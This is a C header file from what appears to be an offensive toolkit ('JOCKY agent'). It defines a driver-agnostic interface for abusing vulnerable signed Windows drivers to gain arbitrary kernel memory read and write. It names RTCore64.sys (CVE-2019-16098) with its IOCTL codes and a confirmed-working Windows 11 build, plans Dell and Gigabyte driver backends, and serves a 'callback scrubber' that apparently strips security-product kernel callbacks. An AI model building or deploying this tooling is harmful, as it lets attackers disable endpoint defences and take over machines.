/*
 * byovd_interface.h -- JOCKY BYOVD subsystem: driver-agnostic R/W contract
 * byovd/kernel_subverter/byovd_interface.h
 *
 * Windows x64 | MinGW/Clang | ring-3
 *
 * PURPOSE
 * -------
 * Defines the vtable (byovd_ops_t) and context struct (byovd_backend_t) that
 * every vulnerable-driver backend must implement. The callback scrubber and
 * the JOCKY agent call ONLY this interface -- they have zero knowledge of which
 * driver is underneath. Swapping drivers means swapping backends, not rewriting
 * the scrubber.
 *
 * CALLING CONVENTION
 * ------------------
 * All ops return byovd_result_t. BYOVD_OK = 0. Anything else is an error code.
 * Callers check the return value. Ops never abort on failure -- they return.
 *
 * BACKENDS IMPLEMENTED
 * --------------------
 *   backend_rtcore64.c   RTCore64.sys  (MSI Afterburner CVE-2019-16098)
 *                        IOCTL 0x80002048 read / 0x8000204C write
 *                        Takes kernel VA directly -- no VA->PA translation
 *                        Max transfer unit: 4 bytes (two calls for QWORD)
 *                        Confirmed working: Win11 24H2 build 26100
 *
 * FUTURE BACKENDS (uncomment in byovd.h when implemented)
 *   backend_dbutil.c     DBUtil_2_3.sys (Dell CVE-2021-21551)
 *   backend_gdrv.c       gdrv.sys       (Gigabyte, MmMapIoSpace based)
 *
 * USAGE PATTERN
 * -------------
 *   byovd_backend_t *b = rtcore64_backend_init("RTCore64.sys");
 *   byovd_engine_init(b);           // loads driver, opens handle
 *   byovd_read(b,  kva, &val, 8);  // 8-byte kernel read
 *   byovd_write(b, kva, &val, 8);  // 8-byte kernel write
 *   byovd_engine_cleanup(b);        // unloads driver, frees backend
 */

#pragma once
#include <windows.h>
#include <stdint.h>
#include <stdio.h>

/* ============================================================
   RESULT CODES
   ============================================================ */

typedef enum {
    BYOVD_OK              = 0,
    BYOVD_ERR_LOAD        = 1,   /* SCM service install or StartService failed   */
    BYOVD_ERR_OPEN        = 2,   /* CreateFile on device path failed             */
    BYOVD_ERR_READ        = 3,   /* DeviceIoControl read failed                  */
    BYOVD_ERR_WRITE       = 4,   /* DeviceIoControl write failed                 */
    BYOVD_ERR_ALIGN       = 5,   /* size or address alignment violation          */
    BYOVD_ERR_NULL        = 6,   /* NULL pointer passed to op                    */
    BYOVD_ERR_UNSUPPORTED = 7,   /* op not implemented by this backend           */
    BYOVD_ERR_UNLOAD      = 8,   /* StopService or DeleteService failed          */
} byovd_result_t;

static inline const char *byovd_result_str(byovd_result_t r) {
    switch (r) {
        case BYOVD_OK:              return "OK";
        case BYOVD_ERR_LOAD:        return "ERR_LOAD";
        case BYOVD_ERR_OPEN:        return "ERR_OPEN";
        case BYOVD_ERR_READ:        return "ERR_READ";
        case BYOVD_ERR_WRITE:       return "ERR_WRITE";
        case BYOVD_ERR_ALIGN:       return "ERR_ALIGN";
        case BYOVD_ERR_NULL:        return "ERR_NULL";
        case BYOVD_ERR_UNSUPPORTED: return "ERR_UNSUPPORTED";
        case BYOVD_ERR_UNLOAD:      return "ERR_UNLOAD";
        default:                    return "ERR_UNKNOWN";
    }
}

/* ============================================================
   FORWARD DECLARATION
   ============================================================ */

typedef struct byovd_backend byovd_backend_t;

/* ============================================================
   VTABLE -- every backend fills this in full
   ============================================================ */

typedef struct {
    /*
     * load -- install the driver service via SCM and call StartService.
     * driver_path is stored in backend->driver_path by _init before this
     * is called. Implementations use backend->driver_path, not a parameter,
     * so the orchestrator doesn't need to track it separately.
     * Returns: BYOVD_OK on success or if already running.
     */
    byovd_result_t (*load)  (byovd_backend_t *self);

    /*
     * open -- CreateFile on the driver's device symlink.
     * Must be called after load(). Stores the HANDLE in backend->device.
     * Returns: BYOVD_OK on success.
     */
    byovd_result_t (*open)  (byovd_backend_t *self);

    /*
     * close -- CloseHandle on backend->device.
     * Safe to call on an already-closed handle.
     */
    void           (*close) (byovd_backend_t *self);

    /*
     * unload -- ControlService(STOP) + DeleteService.
     * Calls close() first if handle is still open.
     * Returns: BYOVD_OK if service was removed.
     */
    byovd_result_t (*unload)(byovd_backend_t *self);

    /*
     * read -- read `size` bytes from kernel VA `addr` into `buf`.
     *
     * Constraints (driver-specific, documented per backend):
     *   RTCore64: max 4 bytes per IOCTL. This op issues ceil(size/4) IOCTLs.
     *   addr+size must not cross a page boundary for sizes > 4.
     *   size must be 1, 2, 4, or 8. No other sizes.
     *
     * Returns: BYOVD_OK on success.
     */
    byovd_result_t (*read)  (byovd_backend_t *self,
                              uintptr_t        addr,
                              void            *buf,
                              size_t           size);

    /*
     * write -- write `size` bytes from `buf` to kernel VA `addr`.
     * Same size/alignment constraints as read.
     * Returns: BYOVD_OK on success.
     */
    byovd_result_t (*write) (byovd_backend_t *self,
                              uintptr_t        addr,
                              const void      *buf,
                              size_t           size);

} byovd_ops_t;

/* ============================================================
   BACKEND CONTEXT -- one per loaded driver
   ============================================================ */

struct byovd_backend {
    /* identity */
    const char   *name;               /* human label: "RTCore64", "DBUtil", etc. */

    /* device */
    HANDLE        device;             /* kernel device handle, INVALID_HANDLE_VALUE if closed */
    char          driver_path[MAX_PATH]; /* absolute path to .sys file               */
    char          svc_name[64];       /* SCM service name                            */
    char          device_path[64];    /* Win32 device symlink: "\\\\.\\RTCore64"    */

    /* vtable */
    byovd_ops_t   ops;

    /* backend-private context -- cast to driver-specific struct in each backend */
    void         *private_ctx;
};

/* ============================================================
   CONVENIENCE WRAPPERS -- call these instead of ops directly
   These add NULL checks and size validation.
   ============================================================ */

static inline byovd_result_t byovd_read(byovd_backend_t *b,
                                         uintptr_t        addr,
                                         void            *buf,
                                         size_t           size)
{
    if (!b || !buf)                        return BYOVD_ERR_NULL;
    if (size != 1 && size != 2
     && size != 4 && size != 8)            return BYOVD_ERR_ALIGN;
    if (b->device == INVALID_HANDLE_VALUE) return BYOVD_ERR_OPEN;
    return b->ops.read(b, addr, buf, size);
}

static inline byovd_result_t byovd_write(byovd_backend_t *b,
                                          uintptr_t        addr,
                                          const void      *buf,
                                          size_t           size)
{
    if (!b || !buf)                        return BYOVD_ERR_NULL;
    if (size != 1 && size != 2
     && size != 4 && size != 8)            return BYOVD_ERR_ALIGN;
    if (b->device == INVALID_HANDLE_VALUE) return BYOVD_ERR_OPEN;
    return b->ops.write(b, addr, buf, size);
}

/* typed convenience: read/write a QWORD */
static inline byovd_result_t byovd_read64(byovd_backend_t *b,
                                            uintptr_t        addr,
                                            uint64_t        *out)
{
    return byovd_read(b, addr, out, 8);
}

static inline byovd_result_t byovd_write64(byovd_backend_t *b,
                                             uintptr_t        addr,
                                             uint64_t         val)
{
    return byovd_write(b, addr, &val, 8);
}